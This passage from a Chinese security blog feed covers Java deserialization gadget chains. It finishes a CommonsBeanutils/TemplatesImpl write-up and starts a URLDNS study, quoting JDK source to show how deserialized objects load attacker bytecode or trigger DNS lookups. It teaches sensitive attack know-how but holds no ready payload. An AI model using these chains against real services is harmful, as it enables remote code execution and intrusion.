style="color:#a6e22e">getOutputProperties</span>() {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> newTransformer().<span style="color:#a6e22e">getOutputProperties</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> (TransformerConfigurationException e) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">synchronized</span> Transformer<span style="color:#a6e22e">newTransformer</span>()</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throws</span> TransformerConfigurationException</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> TransformerImpl transformer;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> transformer<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span></span><span style="display:flex;"><span> _indentNumber, _tfactory);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (_uriResolver<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> transformer.<span style="color:#a6e22e">setURIResolver</span>(_uriResolver);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (_tfactory.<span style="color:#a6e22e">getFeature</span>(XMLConstants.<span style="color:#a6e22e">FEATURE_SECURE_PROCESSING</span>)) {</span></span><span style="display:flex;"><span> transformer.<span style="color:#a6e22e">setSecureProcessing</span>(<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> transformer;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>newTransformer会调用getTransletInstance方法，在该方法内会调用defineTransletClasses方法，defineTransletClasses会读取_bytecodes并通过defineClass方法通过字节码加载成对应的类并构造对应的对象，所以这个过程会执行恶意类的构造方法。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> Translet<span style="color:#a6e22e">getTransletInstance</span>()</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throws</span> TransformerConfigurationException {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (_name<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>)<span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (_class<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) defineTransletClasses();</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// The translet needs to keep a reference to all its auxiliary</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// class to prevent the GC from collecting them</span></span></span><span style="display:flex;"><span> AbstractTranslet translet<span style="color:#f92672">=</span> (AbstractTranslet) _class<span style="color:#f92672">[</span>_transletIndex<span style="color:#f92672">]</span>.<span style="color:#a6e22e">newInstance</span>();</span></span><span style="display:flex;"><span> translet.<span style="color:#a6e22e">postInitialization</span>();</span></span><span style="display:flex;"><span> translet.<span style="color:#a6e22e">setTemplates</span>(<span style="color:#66d9ef">this</span>);</span></span><span style="display:flex;"><span> translet.<span style="color:#a6e22e">setOverrideDefaultParser</span>(_overrideDefaultParser);</span></span><span style="display:flex;"><span> translet.<span style="color:#a6e22e">setAllowedProtocols</span>(_accessExternalStylesheet);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (_auxClasses<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> translet.<span style="color:#a6e22e">setAuxiliaryClasses</span>(_auxClasses);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> translet;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> (InstantiationException e) {</span></span><span style="display:flex;"><span> ErrorMsg err<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">TRANSLET_OBJECT_ERR</span>, _name);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> (IllegalAccessException e) {</span></span><span style="display:flex;"><span> ErrorMsg err<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">TRANSLET_OBJECT_ERR</span>, _name);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">defineTransletClasses</span>()</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throws</span> TransformerConfigurationException {</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (_bytecodes<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> ErrorMsg err<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">NO_TRANSLET_CLASS_ERR</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> TransletClassLoader loader<span style="color:#f92672">=</span> (TransletClassLoader)</span></span><span style="display:flex;"><span> AccessController.<span style="color:#a6e22e">doPrivileged</span>(<span style="color:#66d9ef">new</span> PrivilegedAction() {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Object<span style="color:#a6e22e">run</span>() {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">new</span> TransletClassLoader(ObjectFactory.<span style="color:#a6e22e">findClassLoader</span>(),_tfactory.<span style="color:#a6e22e">getExternalExtensionsMap</span>());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> });</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span><span style="color:#66d9ef">int</span> classCount<span style="color:#f92672">=</span> _bytecodes.<span style="color:#a6e22e">length</span>;</span></span><span style="display:flex;"><span> _class<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[</span>classCount<span style="color:#f92672">]</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (classCount<span style="color:#f92672">></span> 1) {</span></span><span style="display:flex;"><span> _auxClasses<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;></span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span> 0; i<span style="color:#f92672">&lt;</span> classCount; i<span style="color:#f92672">++</span>) {</span></span><span style="display:flex;"><span> _class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span><span style="color:#f92672">=</span> loader.<span style="color:#a6e22e">defineClass</span>(_bytecodes<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> Class superClass<span style="color:#f92672">=</span> _class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>.<span style="color:#a6e22e">getSuperclass</span>();</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Check if this is the main class</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (superClass.<span style="color:#a6e22e">getName</span>().<span style="color:#a6e22e">equals</span>(ABSTRACT_TRANSLET)) {</span></span><span style="display:flex;"><span> _transletIndex<span style="color:#f92672">=</span> i;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> _auxClasses.<span style="color:#a6e22e">put</span>(_class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>.<span style="color:#a6e22e">getName</span>(), _class<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (_transletIndex<span style="color:#f92672">&lt;</span> 0) {</span></span><span style="display:flex;"><span> ErrorMsg err<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">NO_MAIN_TRANSLET_ERR</span>, _name);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> (ClassFormatError e) {</span></span><span style="display:flex;"><span> ErrorMsg err<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">TRANSLET_CLASS_ERR</span>, _name);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">catch</span> (LinkageError e) {</span></span><span style="display:flex;"><span> ErrorMsg err<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> ErrorMsg(ErrorMsg.<span style="color:#a6e22e">TRANSLET_OBJECT_ERR</span>, _name);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> TransformerConfigurationException(err.<span style="color:#a6e22e">toString</span>());</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>所以可以总结:<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的<code>_bytecodes</code>属性可以包含类的字节码，通过<code>newTransformer</code>方法可以调用字节码对应类的构造函数或者静态函数。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">final</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">TemplatesImpl</span><span style="color:#66d9ef">implements</span> Templates, Serializable {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">final</span><span style="color:#66d9ef">long</span> serialVersionUID<span style="color:#f92672">=</span> 673094361519270707L;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">final</span><span style="color:#66d9ef">static</span> String DESERIALIZE_TRANSLET<span style="color:#f92672">=</span><span style="color:#e6db74">"jdk.xml.enableTemplatesImplDeserialization"</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/**</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Name of the superclass of all translets. This is needed to * determine which, among all classes comprising a translet, * is the main one. */</span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">static</span> String ABSTRACT_TRANSLET</span></span><span style="display:flex;"><span><span style="color:#f92672">=</span><span style="color:#e6db74">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/**</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Name of the main class or default name if unknown. */</span><span style="color:#66d9ef">private</span> String _name<span style="color:#f92672">=</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">/**</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Contains the actual class definition for the translet class and * any auxiliary classes. */</span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">byte</span><span style="color:#f92672">[][]</span> _bytecodes<span style="color:#f92672">=</span><span style="color:#66d9ef">null</span>;</span></span></code></pre></div><p>总结一下过程：PriorityQueue对象在反序列化过程中会触发排序，调用comparator.compare，在BeanComparator.compare方法中会尝试获取类的property对应的成员的值，其方法是通过尝试获取成员值对应的getter方法，而后调用这个getter方法。</p><p>而TemplatesImpl类的_bytecodes可以存储字节码并且可以通过newTransformer方法调用这个字节码对应类的构造函数或者静态方法，TemplatesImpl类的getOutputProperties方法会调用newTransformer方法。</p><p>而getOutputProperties在规范中对应于outputProperties的getter方法，最终构成反序列化链。</p><p><strong>参考链接</strong></p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html" target="_blank">https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</a></p></blockquote><p>创建于2024-01-11</p><p><strong>Created at 2024-01-12T14:32:08+08:00</strong></p></description></item><item><title>JAVA URL DNS 研究</title><link>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/urldns/</link><pubDate>Mon, 08 Jan 2024 16:57:37 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/urldns/</guid><description><p><strong>前言</strong></p><p>初步入门java反序列化学习，做一个学习记录，水一篇文章。如果有问题可以邮件：got_<a href="mailto:whipper.0p@icloud.com">whipper.0p@icloud.com</a></p><h4 id="url类dns请求">URL类DNS请求</h4><p>使用URL.equals会发起DNS请求</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">urltest</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args)<span style="color:#66d9ef">throws</span> MalformedURLException {</span></span><span style="display:flex;"><span> System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">"hello "</span>);</span></span><span style="display:flex;"><span> URL u<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">"http://www.baidu.com"</span>);</span></span><span style="display:flex;"><span> URL u1<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">"http://www.baidu.com"</span>);</span></span><span style="display:flex;"><span> System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(u.<span style="color:#a6e22e">equals</span>(u1));</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><img alt="" src="/images/research/web/java-deserialization/urldns.zh-cn.assets/2.png"/></p><p>跟进代码，equals代码如下，</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span><span style="color:#66d9ef">boolean</span><span style="color:#a6e22e">equals</span>(URL u1, URL u2) {</span></span><span style="display:flex;"><span> String ref1<span style="color:#f92672">=</span> u1.<span style="color:#a6e22e">getRef</span>();</span></span><span style="display:flex;"><span> String ref2<span style="color:#f92672">=</span> u2.<span style="color:#a6e22e">getRef</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (ref1<span style="color:#f92672">==</span> ref2<span style="color:#f92672">||</span> (ref1<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span><span style="color:#f92672">&amp;&amp;</span> ref1.<span style="color:#a6e22e">equals</span>(ref2)))<span style="color:#f92672">&amp;&amp;</span></span></span><span style="display:flex;"><span> sameFile(u1, u2);</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>判断reference是否相同，而后使用sameFile函数，sameFile函数会查看其协议、uri、端口、主机是否相等。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span><span style="color:#66d9ef">boolean</span><span style="color:#a6e22e">sameFile</span>(URL u1, URL u2) {</span></span><span style="display:flex;"><span><span style="color:#75715e">// Compare the protocols.</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>((u1.<span style="color:#a6e22e">getProtocol</span>()<span style="color:#f92672">==</span> u2.<span style="color:#a6e22e">getProtocol</span>())<span style="color:#f92672">||</span></span></span><span style="display:flex;"><span> (u1.<span style="color:#a6e22e">getProtocol</span>()<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span><span style="color:#f92672">&amp;&amp;</span></span></span><span style="display:flex;"><span> u1.<span style="color:#a6e22e">getProtocol</span>().<span style="color:#a6e22e">equalsIgnoreCase</span>(u2.<span style="color:#a6e22e">getProtocol</span>()))))</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">false</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Compare the files.</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(u1.<span style="color:#a6e22e">getFile</span>()<span style="color:#f92672">==</span> u2.<span style="color:#a6e22e">getFile</span>()<span style="color:#f92672">||</span></span></span><span style="display:flex;"><span> (u1.<span style="color:#a6e22e">getFile</span>()<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span><span style="color:#f92672">&amp;&amp;</span> u1.<span style="color:#a6e22e">getFile</span>().<span style="color:#a6e22e">equals</span>(u2.<span style="color:#a6e22e">getFile</span>()))))</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">false</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Compare the ports.</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> port1, port2;</span></span><span style="display:flex;"><span> port1<span style="color:#f92672">=</span> (u1.<span style="color:#a6e22e">getPort</span>()<span style="color:#f92672">!=</span><span style="color:#f92672">-</span>1)<span style="color:#f92672">?</span> u1.<span style="color:#a6e22e">getPort</span>() : u1.<span style="color:#a6e22e">handler</span>.<span style="color:#a6e22e">getDefaultPort</span>();</span></span><span style="display:flex;"><span> port2<span style="color:#f92672">=</span> (u2.<span style="color:#a6e22e">getPort</span>()<span style="color:#f92672">!=</span><span style="color:#f92672">-</span>1)<span style="color:#f92672">?</span> u2.<span style="color:#a6e22e">getPort</span>() : u2.<span style="color:#a6e22e">handler</span>.<span style="color:#a6e22e">getDefaultPort</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (port1<span style="color:#f92672">!=</span> port2)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">false</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Compare the hosts.</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hostsEqual(u1, u2))</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">false</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">true</span>;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>hostsEqual方法中会调用getHostAddress方法，getHostAddress方法会通过InetAddress.getByName函数获取到域名对应的IP地址，触发DNS解析</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span><span style="color:#66d9ef">boolean</span><span style="color:#a6e22e">hostsEqual</span>(URL u1, URL u2) {</span></span><span style="display:flex;"><span> InetAddress a1<span style="color:#f92672">=</span> getHostAddress(u1);</span></span><span style="display:flex;"><span> InetAddress a2<span style="color:#f92672">=</span> getHostAddress(u2);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span><span style="color:#66d9ef">synchronized</span> InetAddress<span style="color:#a6e22e">getHostAddress</span>(URL u) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (u.<span style="color:#a6e22e">hostAddress</span><span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> u.<span style="color:#a6e22e">hostAddress</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> String host<span style="color:#f92672">=</span> u.<span style="color:#a6e22e">getHost</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (host<span style="color:#f92672">==</span><span style="color:#66d9ef">null</span><span style="color:#f92672">||</span> host.<span style="color:#a6e22e">isEmpty</span>()) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {</span></span><span style="display:flex;"><span> u.<span style="color:#a6e22e">hostAddress</span><span style="color:#f92672">=</span> InetAddress.<span style="color:#a6e22e">getByName</span>(host);</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (UnknownHostException ex) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">catch</span> (SecurityException se) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> u.<span style="color:#a6e22e">hostAddress</span>;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>同样的URL类中的hashCode也会触发DNS请求，通过getHostAddress获取到IP地址，需要注意的是其中hashCode会被缓存</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#66d9ef">synchronized</span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">hashCode</span>() {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (hashCode<span style="color:#f92672">!=</span><span style="color:#f92672">-</span>1)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> hashCode;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> hashCode<span style="color:#f92672">=</span> handler.<span style="color:#a6e22e">hashCode</span>(<span style="color:#66d9ef">this</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> hashCode;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span><span style="color:#66d9ef">int</span><span style="color:#a6e22e">hashCode</span>(URL u) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> h<span style="color:#f92672">=</span> 0;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Generate the protocol part.</span></span></span><span style="display:flex;"><span> String protocol<span style="color:#f92672">=</span> u.<span style="color:#a6e22e">getProtocol</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (protocol<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> h<span style="color:#f92672">+=</span> protocol.<span style="color:#a6e22e">hashCode</span>();</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// Generate the host part.</span></span></span><span style="display:flex;"><span> InetAddress addr<span style="color:#f92672">=</span> getHostAddress(u);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (addr<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>) {</span></span><span style="display:flex;"><span> h<span style="color:#f92672">+=</span> addr.<span style="color:#a6e22e">hashCode</span>();</span></span><span style="display:flex;"><span> }<span style="color:#66d9ef">else</span> {</span></span><span style="display:flex;"><span> String host<span style="color:#f92672">=</span> u.<span style="color:#a6e22e">getHost</span>();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (host<span style="color:#f92672">!=</span><span style="color:#66d9ef">null</span>)</span></span><span style="display:flex;"><span> h<span style="color:#f92672">+=</span> host.<span style="color:#a6e22e">toLowerCase</span>().<span style="color:#a6e22e">hashCode</span>();</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>通过调用URL类的equals和hashCode方法即可触发DNS请求</p><h4 id="hashmap原理">HashMap原理</h4><p><strong>数据结构</strong></p><p>HashMap采用数组+链表方式存储键值对，其中链表为单向链表</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">transient</span> Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">>[]</span> table;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">Node</span><span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">></span><span style="color:#66d9ef">implements</span> Map.<span style="color:#a6e22e">Entry</span><span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">></span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span><span style="color:#66d9ef">int</span> hash;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> K key;</span></span><span style="display:flex;"><span> V value;</span></span><span style="display:flex;"><span> Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">></span> next;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> Node(<span style="color:#66d9ef">int</span> hash, K key, V value, Node<span style="color:#f92672">&lt;</span>K,V<span style="color:#f92672">></span> next) {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">hash</span><span style="color:#f92672">=</span> hash;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">key</span><span style="color:#f92672">=</span> key;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">value</span><span style="color:#f92672">=</span> value;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">next</span><span style="color:#f92672">=</span> next;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>默认情况下java中的HashMap大小只有16，当产生hash冲突时，就把它插入到链表中的下一个元素，在取出元素时，首先计算hash，根据hash找到对应的链表，而后遍历链表获取到value。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">static</span><span style="color:#66d9ef">final</span><span style="color:#66d9ef">int</span> DEFAULT_INITIAL_CAPACITY<span style="color:#f92672">=</span> 1<span style="color:#f92672">&lt;&lt;</span> 4;</span></span></code></pre></div><p>可以用如下图<img alt="" src="/images/research/web/java-deserialization/urldns.zh-cn.assets/1.webp"/></p><p>HashMap重写了readObject方法，反序列化HashMap数据时会调用重写的readObject方法，代码如下</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">private</span><span style="color:#66d9ef">void</span><span style="color:#a6e22e">readObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectInputStream</span> s)</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {</span></span><span style="display:flex;"><span><span style="color:#75715e">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span></span><span style="display:flex;"><span> s.<span style="color:#a6e22e">defaultReadObject</span>();</span></span><span style="display:flex;"><span> reinitialize();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (loadFactor<span style="color:#f92672">&lt;=</span> 0<span style="color:#f92672">||</span> Float.<span style="color:#a6e22e">isNaN</span>(loadFactor))</span></span><span style="display:flex;"><span><span style="color:#66d9ef">throw</span><span style="color:#66d9ef">new</span> InvalidObjectException(<span style="color:#e6db74">"Illegal load factor: "</span><span style="color:#f92672">+</span></span></span><span style="display:flex;"><span> loadFactor);</span></span><span style="display:flex;"><span> s.<span style="color:#a6e22e">readInt</span>();<span style="color:#75715e">// Read and ignore number of buckets</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> 